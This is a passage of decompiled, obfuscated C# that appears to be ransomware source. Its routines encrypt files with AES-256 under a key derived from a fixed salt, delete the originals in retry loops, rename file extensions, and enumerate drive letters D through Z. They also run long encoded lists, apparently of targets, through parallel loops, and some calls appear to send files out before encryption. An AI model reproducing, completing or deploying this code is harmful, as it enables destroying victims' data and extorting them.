			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (baVPzfInuLOtD == getString_0(107396809))
					{
						foreach (string item in vAvIzfBtHKG)
						{
							if (string_0.ToLower().EndsWith(item) && ilWxgAZLeD == getString_0(107396809))
							{
								if (Convert.ToInt32(ZCRgCrsIaCud) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107391985), getString_0(107391980), getString_0(107391935), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && ilWxgAZLeD == getString_0(107397066))
							{
								try
								{
									vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107391985), getString_0(107391980), getString_0(107391935), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107388150)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107388150), getString_0(107391872)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void zGYgJOabDUZgZoa(string kaODXMTRxX, string vKpVGEHyYYUBZP, byte[] FjZSqwxUsBKT, byte[] LyruqQMcUjpUvXL = null)
	{
		try
		{
			if (baVPzfInuLOtD == getString_0(107396809))
			{
				FileStream fileStream = new FileStream(kaODXMTRxX, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in vAvIzfBtHKG)
				{
					if (kaODXMTRxX.ToLower().EndsWith(item) && ilWxgAZLeD == getString_0(107396809))
					{
						if (Convert.ToInt32(ZCRgCrsIaCud) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107391985), getString_0(107391980), getString_0(107391935), kaODXMTRxX);
							}
							catch
							{
							}
						}
					}
					else if (kaODXMTRxX.ToLower().EndsWith(item) && ilWxgAZLeD == getString_0(107397066))
					{
						try
						{
							vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107391985), getString_0(107391980), getString_0(107391935), kaODXMTRxX);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (kaODXMTRxX != vKpVGEHyYYUBZP)
		{
			File.Move(kaODXMTRxX, vKpVGEHyYYUBZP);
			kaODXMTRxX = vKpVGEHyYYUBZP;
		}
		byte[] bytes = MVtRUvNrdgwG.ELBkKiLWwNhvzh(File.ReadAllBytes(kaODXMTRxX), FjZSqwxUsBKT, LyruqQMcUjpUvXL);
		File.WriteAllBytes(kaODXMTRxX, bytes);
		TdmvufTfNVtQu++;
	}

	private static void UgscNpyaZraAU(string string_0, string string_1, byte[] byte_0)
	{
		bVaunqIQZmY CS_0024_003C_003E8__locals0 = new bVaunqIQZmY();
		CS_0024_003C_003E8__locals0.bgfwrbttsCB = string_0;
		CS_0024_003C_003E8__locals0.SmfMppMusmMh = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string smfMppMusmMh = CS_0024_003C_003E8__locals0.SmfMppMusmMh;
			FileStream fileStream = new FileStream(smfMppMusmMh, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (JMHEmrUMtFhk == getString_0(107396809))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.bgfwrbttsCB, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.bgfwrbttsCB, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.bgfwrbttsCB, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.SmfMppMusmMh.Length > 0)
				{
					if (baVPzfInuLOtD == getString_0(107396809))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.bgfwrbttsCB, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in vAvIzfBtHKG)
						{
							if (CS_0024_003C_003E8__locals0.bgfwrbttsCB.ToLower().EndsWith(item) && ilWxgAZLeD == getString_0(107396809))
							{
								if (Convert.ToInt32(ZCRgCrsIaCud) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107391985), getString_0(107391980), getString_0(107391935), CS_0024_003C_003E8__locals0.bgfwrbttsCB);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.bgfwrbttsCB.ToLower().EndsWith(item) && ilWxgAZLeD == getString_0(107397066))
							{
								try
								{
									vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107391985), getString_0(107391980), getString_0(107391935), CS_0024_003C_003E8__locals0.bgfwrbttsCB);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.bgfwrbttsCB);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.SmfMppMusmMh.EndsWith(getString_0(107388150)))
					{
						File.Move(CS_0024_003C_003E8__locals0.SmfMppMusmMh, CS_0024_003C_003E8__locals0.SmfMppMusmMh.Replace(getString_0(107388150), getString_0(107391872)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.SmfMppMusmMh))
							{
								File.Delete(CS_0024_003C_003E8__locals0.SmfMppMusmMh);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (rcFXGcWApOJB)
			{
				try
				{
					File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388919) + CS_0024_003C_003E8__locals0.bgfwrbttsCB + getString_0(107388173) + ex2.Message + getString_0(107396245));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> cHEqUUkGipABPu = CHEqUUkGipABPu;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388088)), string_0);
			};
		}
		Parallel.ForEach(cHEqUUkGipABPu, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> zsaqBdazbYagVe = ZsaqBdazbYagVe;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388107)), string_0);
			};
		}
		Parallel.ForEach(zsaqBdazbYagVe, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (BikvpigWlHBvTVo == getString_0(107396809))
		{
			string[] kbzdUUqksSGIlhW = KbzdUUqksSGIlhW;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388107)), getString_0(107388050) + string_0 + getString_0(107388073));
				};
			}
			Parallel.ForEach(kbzdUUqksSGIlhW, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!UkwNvBJJCwFjgR().Contains(getString_0(107388817)))
		{
			ZRImcljqIISuaY(GVRjAaBfQw);
		}
		else
		{
			List<string> source = yjfXukyygoMtg;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					xxpegTfogDffK(JqDJfBiOyDaAy(lOmjExCerIObT(getString_0(107388068))), string_0);
				};
			}
			Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> source2 = oOZoSUJWDLjw;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388043)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388088)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388107)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388107)), getString_0(107388050) + string_0 + getString_0(107388073));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		xxpegTfogDffK(JqDJfBiOyDaAy(lOmjExCerIObT(getString_0(107388068))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388043)), string_0);
	}

	private static void _003CMapDrv_003Eb__17(string string_0)
	{
		dBfCHUgEGYG CS_0024_003C_003E8__locals0 = new dBfCHUgEGYG();
		CS_0024_003C_003E8__locals0.cCKscmLjgqEgN = string_0;
		if ((!CS_0024_003C_003E8__locals0.cCKscmLjgqEgN.StartsWith(getString_0(107388506)) && !CS_0024_003C_003E8__locals0.cCKscmLjgqEgN.StartsWith(getString_0(107388501)) && !CS_0024_003C_003E8__locals0.cCKscmLjgqEgN.StartsWith(getString_0(107388524)) && !CS_0024_003C_003E8__locals0.cCKscmLjgqEgN.StartsWith(getString_0(107391872))) || !pkcHoAftRnR.BNCnsqaGxavT(CS_0024_003C_003E8__locals0.cCKscmLjgqEgN))
		{
			return;
		}
		try
		{
			Thread.Sleep(LoqeOEkLpePTMECv);
			FYgeyItMBgHKLJgZ.Add(getString_0(107390951) + CS_0024_003C_003E8__locals0.cCKscmLjgqEgN + getString_0(107388479));
			try
			{
				if (DcTmJYuRqmJcpcY)
				{
					Console.WriteLine(getString_0(107390951) + CS_0024_003C_003E8__locals0.cCKscmLjgqEgN + getString_0(107388479));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(LoqeOEkLpePTMECv);
				FYgeyItMBgHKLJgZ.Add(dBfCHUgEGYG.getString_0(107390957) + CS_0024_003C_003E8__locals0.cCKscmLjgqEgN + dBfCHUgEGYG.getString_0(107397185) + (char)int_0 + dBfCHUgEGYG.getString_0(107405487));
				try
				{
					if (DcTmJYuRqmJcpcY)
					{
						Console.WriteLine(dBfCHUgEGYG.getString_0(107390957) + CS_0024_003C_003E8__locals0.cCKscmLjgqEgN + dBfCHUgEGYG.getString_0(107397185) + (char)int_0 + dBfCHUgEGYG.getString_0(107405487));
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	static RQEwPOshulKqs()
	{
		Strings.CreateGetStringDelegate(typeof(RQEwPOshulKqs));
		nadKcguuEob = getString_0(107391259);
		jBAOFpxRKVADf = null;
		buxEOyFbGjfNzeAW = getString_0(107397066);
		GZecQutuAYrd = getString_0(107388470);
		FYgeyItMBgHKLJgZ = new List<string>();
		omtVrtitMiabP = new List<string>();
		pOtDvyWFjbzh = getString_0(107397066);
		DUKuBNRvAydYG = getString_0(107391872);
		sCJKcfPXYjG = getString_0(107391872);
		OakwZVTgeU = getString_0(107391872);
		vvlqbuyzBdCXr = getString_0(107397066);
		jgiMwmtEjAHW = 0;
		xziKmMkpqKW = getString_0(107397066);
		zTlSyJlotVldKzTU = getString_0(107397066);
		htFsgMsmbJE = getString_0(107397066);
		StbJRQYjoJ = getString_0(107388489);
		fUZuJApNUKnlFF = getString_0(107397066);
		ISouoNnrGAOBU = getString_0(107397066);
		yCaQazXapFOCn = getString_0(107397066);
		FVhIETATHxQtua = getString_0(107397066);
		MQstfrKstw = new List<string>
		{
			JqDJfBiOyDaAy(getString_0(107388484)),
			JqDJfBiOyDaAy(getString_0(107388435)),
			JqDJfBiOyDaAy(getString_0(107388410)),
			JqDJfBiOyDaAy(getString_0(107388425)),
			JqDJfBiOyDaAy(getString_0(107388400)),
			JqDJfBiOyDaAy(getString_0(107388343)),
			JqDJfBiOyDaAy(getString_0(107388358)),
			JqDJfBiOyDaAy(getString_0(107388333)),
			JqDJfBiOyDaAy(getString_0(107388276)),
			JqDJfBiOyDaAy(getString_0(107387739)),
			JqDJfBiOyDaAy(getString_0(107387754)),
			JqDJfBiOyDaAy(getString_0(107387729)),
			JqDJfBiOyDaAy(getString_0(107387672))
		};
		ytgqYFajIsYkRHo = new List<string>();
		pxkCnyUGyETTR = getString_0(107397066);
		OmqUzOUWvCqqNT = getString_0(107397066);
		mjPjVtDKVS = getString_0(107397066);
		oODUpNadLmFxS = new List<string>();
		owZjdTzpAYQt = getString_0(107397066);
		dhVHnESaEPM = getString_0(107387647);
		RPyXoPlOJmdYqIY = getString_0(107397066);
		MjCiACobZAma = getString_0(107397066);
		uPyBpQgrykgNTrW = new List<string>
		{
			JqDJfBiOyDaAy(getString_0(107387630)),
			JqDJfBiOyDaAy(getString_0(107387597)),
			JqDJfBiOyDaAy(getString_0(107387564)),
			JqDJfBiOyDaAy(getString_0(107387531)),
			JqDJfBiOyDaAy(getString_0(107388010)),
			JqDJfBiOyDaAy(getString_0(107387981)),
			JqDJfBiOyDaAy(getString_0(107387892)),
			JqDJfBiOyDaAy(getString_0(107387863)),
			JqDJfBiOyDaAy(getString_0(107387850)),
			JqDJfBiOyDaAy(getString_0(107387785)),
			JqDJfBiOyDaAy(getString_0(107387240)),
			JqDJfBiOyDaAy(getString_0(107387207)),
			JqDJfBiOyDaAy(getString_0(107387174)),
			JqDJfBiOyDaAy(getString_0(107387145)),
			JqDJfBiOyDaAy(getString_0(107387116)),
			JqDJfBiOyDaAy(getString_0(107387075)),
			JqDJfBiOyDaAy(getString_0(107387002)),
			JqDJfBiOyDaAy(getString_0(107387457)),
			JqDJfBiOyDaAy(getString_0(107387440)),
			JqDJfBiOyDaAy(getString_0(107387407)),
			JqDJfBiOyDaAy(getString_0(107387346)),
			JqDJfBiOyDaAy(getString_0(107387337)),
			JqDJfBiOyDaAy(getString_0(107387264)),
			JqDJfBiOyDaAy(getString_0(107386719)),
			JqDJfBiOyDaAy(getString_0(107386702)),
			JqDJfBiOyDaAy(getString_0(107386613)),
			JqDJfBiOyDaAy(getString_0(107386604)),
			JqDJfBiOyDaAy(getString_0(107386575)),
			JqDJfBiOyDaAy(getString_0(107386534)),
			JqDJfBiOyDaAy(getString_0(107386989)),
			JqDJfBiOyDaAy(getString_0(107386924)),
			JqDJfBiOyDaAy(getString_0(107386835)),
			JqDJfBiOyDaAy(getString_0(107386770)),
			JqDJfBiOyDaAy(getString_0(107386209)),
			JqDJfBiOyDaAy(getString_0(107386144)),
			JqDJfBiOyDaAy(getString_0(107386119)),
			JqDJfBiOyDaAy(getString_0(107386086)),
			JqDJfBiOyDaAy(getString_0(107386013)),
			JqDJfBiOyDaAy(getString_0(107385972)),
			JqDJfBiOyDaAy(getString_0(107386471)),
			JqDJfBiOyDaAy(getString_0(107386442)),
			JqDJfBiOyDaAy(getString_0(107386377)),
			JqDJfBiOyDaAy(getString_0(107386304)),
			JqDJfBiOyDaAy(getString_0(107386271)),
			JqDJfBiOyDaAy(getString_0(107386230)),
			JqDJfBiOyDaAy(getString_0(107385701)),
			JqDJfBiOyDaAy(getString_0(107385624)),
			JqDJfBiOyDaAy(getString_0(107385583)),
			JqDJfBiOyDaAy(getString_0(107385538)),
			JqDJfBiOyDaAy(getString_0(107385461)),
			JqDJfBiOyDaAy(getString_0(107385960)),
			JqDJfBiOyDaAy(getString_0(107385887)),
			JqDJfBiOyDaAy(getString_0(107385814)),
			JqDJfBiOyDaAy(getString_0(107385785)),
			JqDJfBiOyDaAy(getString_0(107385776)),
			JqDJfBiOyDaAy(getString_0(107385199)),
			JqDJfBiOyDaAy(getString_0(107385154)),
			JqDJfBiOyDaAy(getString_0(107385125)),
			JqDJfBiOyDaAy(getString_0(107385048)),
			JqDJfBiOyDaAy(getString_0(107384983)),
			JqDJfBiOyDaAy(getString_0(107384954)),
			JqDJfBiOyDaAy(getString_0(107385409)),
			JqDJfBiOyDaAy(getString_0(107385344)),
			JqDJfBiOyDaAy(getString_0(107385303)),
			JqDJfBiOyDaAy(getString_0(107385274)),
			JqDJfBiOyDaAy(getString_0(107385265)),
			JqDJfBiOyDaAy(getString_0(107384640)),
			JqDJfBiOyDaAy(getString_0(107384611)),
			JqDJfBiOyDaAy(getString_0(107384506)),
			JqDJfBiOyDaAy(getString_0(107384493)),
			JqDJfBiOyDaAy(getString_0(107384460)),
			JqDJfBiOyDaAy(getString_0(107384931)),
			JqDJfBiOyDaAy(getString_0(107384822)),
			JqDJfBiOyDaAy(getString_0(107384809)),
			JqDJfBiOyDaAy(getString_0(107384720)),
			JqDJfBiOyDaAy(getString_0(107384127)),
			JqDJfBiOyDaAy(getString_0(107384130)),
			JqDJfBiOyDaAy(getString_0(107384057)),
			JqDJfBiOyDaAy(getString_0(107383992)),
			JqDJfBiOyDaAy(getString_0(107383975)),
			JqDJfBiOyDaAy(getString_0(107384430)),
			JqDJfBiOyDaAy(getString_0(107384397)),
			JqDJfBiOyDaAy(getString_0(107384336)),
			JqDJfBiOyDaAy(getString_0(107384247)),
			JqDJfBiOyDaAy(getString_0(107386119)),
			JqDJfBiOyDaAy(getString_0(107384190)),
			JqDJfBiOyDaAy(getString_0(107383637)),
			JqDJfBiOyDaAy(getString_0(107383548)),
			JqDJfBiOyDaAy(getString_0(107383535)),
			JqDJfBiOyDaAy(getString_0(107383442)),
			JqDJfBiOyDaAy(getString_0(107383417)),
			JqDJfBiOyDaAy(getString_0(107383916)),
			JqDJfBiOyDaAy(getString_0(107383835)),
			JqDJfBiOyDaAy(getString_0(107386989)),
			JqDJfBiOyDaAy(getString_0(107383770)),
			JqDJfBiOyDaAy(getString_0(107383761)),
			JqDJfBiOyDaAy(getString_0(107383672)),
			JqDJfBiOyDaAy(getString_0(107386924)),
			JqDJfBiOyDaAy(getString_0(107383119)),
			JqDJfBiOyDaAy(getString_0(107383038)),
			JqDJfBiOyDaAy(getString_0(107382981)),
			JqDJfBiOyDaAy(getString_0(107382916)),
			JqDJfBiOyDaAy(getString_0(107383347)),
			JqDJfBiOyDaAy(getString_0(107386770)),
			JqDJfBiOyDaAy(getString_0(107383302)),
			JqDJfBiOyDaAy(getString_0(107386086)),
			JqDJfBiOyDaAy(getString_0(107386209)),
			JqDJfBiOyDaAy(getString_0(107383269)),
			JqDJfBiOyDaAy(getString_0(107383212)),
			JqDJfBiOyDaAy(getString_0(107386144)),
			JqDJfBiOyDaAy(getString_0(107383179)),
			JqDJfBiOyDaAy(getString_0(107382586)),
			JqDJfBiOyDaAy(getString_0(107382569)),
			JqDJfBiOyDaAy(getString_0(107386534)),
			JqDJfBiOyDaAy(getString_0(107382544)),
			JqDJfBiOyDaAy(getString_0(107382499)),
			JqDJfBiOyDaAy(getString_0(107382470)),
			JqDJfBiOyDaAy(getString_0(107382441)),
			JqDJfBiOyDaAy(getString_0(107382876)),
			JqDJfBiOyDaAy(getString_0(107382843)),
			JqDJfBiOyDaAy(getString_0(107382850)),
			JqDJfBiOyDaAy(getString_0(107382773)),
			JqDJfBiOyDaAy(getString_0(107382748)),
			JqDJfBiOyDaAy(getString_0(107382707)),
			JqDJfBiOyDaAy(getString_0(107382694)),
			JqDJfBiOyDaAy(getString_0(107382101)),
			JqDJfBiOyDaAy(getString_0(107382044)),
			JqDJfBiOyDaAy(getString_0(107382011)),
			JqDJfBiOyDaAy(getString_0(107381998)),
			JqDJfBiOyDaAy(getString_0(107381965)),
			JqDJfBiOyDaAy(getString_0(107381924)),
			JqDJfBiOyDaAy(getString_0(107386575)),
			JqDJfBiOyDaAy(getString_0(107382101)),
			JqDJfBiOyDaAy(getString_0(107382363)),
			JqDJfBiOyDaAy(getString_0(107382334)),
			JqDJfBiOyDaAy(getString_0(107382305)),
			JqDJfBiOyDaAy(getString_0(107382288)),
			JqDJfBiOyDaAy(getString_0(107382247)),
			JqDJfBiOyDaAy(getString_0(107382186)),
			JqDJfBiOyDaAy(getString_0(107381569)),
			JqDJfBiOyDaAy(getString_0(107381572)),
			JqDJfBiOyDaAy(getString_0(107381539)),
			JqDJfBiOyDaAy(getString_0(107381434)),
			JqDJfBiOyDaAy(getString_0(107381405)),
			JqDJfBiOyDaAy(getString_0(107381392)),
			JqDJfBiOyDaAy(getString_0(107381839)),
			JqDJfBiOyDaAy(getString_0(107381806)),
			JqDJfBiOyDaAy(getString_0(107381729)),
			JqDJfBiOyDaAy(getString_0(107381700)),
			JqDJfBiOyDaAy(getString_0(107381667)),
			JqDJfBiOyDaAy(getString_0(107381078)),
			JqDJfBiOyDaAy(getString_0(107381013)),
			JqDJfBiOyDaAy(getString_0(107380980)),
			JqDJfBiOyDaAy(getString_0(107380971)),
			JqDJfBiOyDaAy(getString_0(107380890)),
			JqDJfBiOyDaAy(getString_0(107386702)),
			JqDJfBiOyDaAy(getString_0(107380861)),
			JqDJfBiOyDaAy(getString_0(107381348)),
			JqDJfBiOyDaAy(getString_0(107381275)),
			JqDJfBiOyDaAy(getString_0(107381262)),
			JqDJfBiOyDaAy(getString_0(107381221)),
			JqDJfBiOyDaAy(getString_0(107381144)),
			JqDJfBiOyDaAy(getString_0(107413339)),
			JqDJfBiOyDaAy(getString_0(107413322)),
			JqDJfBiOyDaAy(getString_0(107413241)),
			JqDJfBiOyDaAy(getString_0(107413184)),
			JqDJfBiOyDaAy(getString_0(107413159)),
			JqDJfBiOyDaAy(getString_0(107413594)),
			JqDJfBiOyDaAy(getString_0(107413585)),
			JqDJfBiOyDaAy(getString_0(107413496)),
			JqDJfBiOyDaAy(getString_0(107386613)),
			JqDJfBiOyDaAy(getString_0(107413455)),
			JqDJfBiOyDaAy(getString_0(107413394)),
			JqDJfBiOyDaAy(getString_0(107413393)),
			JqDJfBiOyDaAy(getString_0(107412840)),
			JqDJfBiOyDaAy(getString_0(107412811)),
			JqDJfBiOyDaAy(getString_0(107386719)),
			JqDJfBiOyDaAy(getString_0(107412770)),
			JqDJfBiOyDaAy(getString_0(107412721)),
			JqDJfBiOyDaAy(getString_0(107412660)),
			JqDJfBiOyDaAy(getString_0(107384954)),
			JqDJfBiOyDaAy(getString_0(107412627)),
			JqDJfBiOyDaAy(getString_0(107412660)),
			JqDJfBiOyDaAy(getString_0(107412598)),
			JqDJfBiOyDaAy(getString_0(107413081)),
			JqDJfBiOyDaAy(getString_0(107413052)),
			JqDJfBiOyDaAy(getString_0(107413035)),
			JqDJfBiOyDaAy(getString_0(107412954)),
			JqDJfBiOyDaAy(getString_0(107412945)),
			JqDJfBiOyDaAy(getString_0(107412852)),
			JqDJfBiOyDaAy(getString_0(107412311)),
			JqDJfBiOyDaAy(getString_0(107412302)),
			JqDJfBiOyDaAy(getString_0(107412225)),
			JqDJfBiOyDaAy(getString_0(107412180)),
			JqDJfBiOyDaAy(getString_0(107412147)),
			JqDJfBiOyDaAy(getString_0(107412090)),
			JqDJfBiOyDaAy(getString_0(107412589)),
			JqDJfBiOyDaAy(getString_0(107412500)),
			JqDJfBiOyDaAy(getString_0(107412467)),
			JqDJfBiOyDaAy(getString_0(107412458)),
			JqDJfBiOyDaAy(getString_0(107412429)),
			JqDJfBiOyDaAy(getString_0(107412368)),
			JqDJfBiOyDaAy(getString_0(107411823)),
			JqDJfBiOyDaAy(getString_0(107411734)),
			JqDJfBiOyDaAy(getString_0(107411725)),
			JqDJfBiOyDaAy(getString_0(107411644)),
			JqDJfBiOyDaAy(getString_0(107411611)),
			JqDJfBiOyDaAy(getString_0(107411594)),
			JqDJfBiOyDaAy(getString_0(107412029)),
			JqDJfBiOyDaAy(getString_0(107412012)),
			JqDJfBiOyDaAy(getString_0(107411935)),
			JqDJfBiOyDaAy(getString_0(107411918)),
			JqDJfBiOyDaAy(getString_0(107411885)),
			JqDJfBiOyDaAy(getString_0(107411844)),
			JqDJfBiOyDaAy(getString_0(107411259)),
			JqDJfBiOyDaAy(getString_0(107411246)),
			JqDJfBiOyDaAy(getString_0(107382247)),
			JqDJfBiOyDaAy(getString_0(107411213)),
			JqDJfBiOyDaAy(getString_0(107411172)),
			JqDJfBiOyDaAy(getString_0(107411115)),
			JqDJfBiOyDaAy(getString_0(107411086)),
			JqDJfBiOyDaAy(getString_0(107411565)),
			JqDJfBiOyDaAy(getString_0(107411532)),
			JqDJfBiOyDaAy(getString_0(107411451)),
			JqDJfBiOyDaAy(getString_0(107411422)),
			JqDJfBiOyDaAy(getString_0(107411409)),
			JqDJfBiOyDaAy(getString_0(107411364)),
			JqDJfBiOyDaAy(getString_0(107410779)),
			JqDJfBiOyDaAy(getString_0(107410754)),
			JqDJfBiOyDaAy(getString_0(107410705)),
			JqDJfBiOyDaAy(getString_0(107410644)),
			JqDJfBiOyDaAy(getString_0(107410631))
		};
		CHEqUUkGipABPu = new List<string>
		{
			JqDJfBiOyDaAy(getString_0(107410558)),
			JqDJfBiOyDaAy(getString_0(107411053)),
			JqDJfBiOyDaAy(getString_0(107410972)),
			JqDJfBiOyDaAy(getString_0(107410955)),
			JqDJfBiOyDaAy(getString_0(107410874)),
			JqDJfBiOyDaAy(getString_0(107410809)),
			JqDJfBiOyDaAy(getString_0(107410252)),
			JqDJfBiOyDaAy(getString_0(107410191))
		};
		ZsaqBdazbYagVe = new List<string>
		{
			JqDJfBiOyDaAy(getString_0(107410102)),
			JqDJfBiOyDaAy(getString_0(107410069)),
			JqDJfBiOyDaAy(getString_0(107410056)),
			JqDJfBiOyDaAy(getString_0(107410487)),
			JqDJfBiOyDaAy(getString_0(107410454)),
			JqDJfBiOyDaAy(getString_0(107410437)),
			JqDJfBiOyDaAy(getString_0(107410360)),
			JqDJfBiOyDaAy(getString_0(107410327)),
			JqDJfBiOyDaAy(getString_0(107410294)),
			JqDJfBiOyDaAy(getString_0(107409749)),
			JqDJfBiOyDaAy(getString_0(107409716)),
			JqDJfBiOyDaAy(getString_0(107409683)),
			JqDJfBiOyDaAy(getString_0(107409674)),
			JqDJfBiOyDaAy(getString_0(107409601)),
			JqDJfBiOyDaAy(getString_0(107409556)),
			JqDJfBiOyDaAy(getString_0(107409523)),
			JqDJfBiOyDaAy(getString_0(107410026)),
			JqDJfBiOyDaAy(getString_0(107409993)),
			JqDJfBiOyDaAy(getString_0(107409920)),
			JqDJfBiOyDaAy(getString_0(107409879)),
			JqDJfBiOyDaAy(getString_0(107409846)),
			JqDJfBiOyDaAy(getString_0(107409837)),
			JqDJfBiOyDaAy(getString_0(107409804)),
			JqDJfBiOyDaAy(getString_0(107410102)),
			JqDJfBiOyDaAy(getString_0(107409251)),
			JqDJfBiOyDaAy(getString_0(107409178)),
			JqDJfBiOyDaAy(getString_0(107409165)),
			JqDJfBiOyDaAy(getString_0(107409132)),
			JqDJfBiOyDaAy(getString_0(107409091)),
			JqDJfBiOyDaAy(getString_0(107409018)),
			JqDJfBiOyDaAy(getString_0(107409497)),
			JqDJfBiOyDaAy(getString_0(107409488)),
			JqDJfBiOyDaAy(getString_0(107409447)),
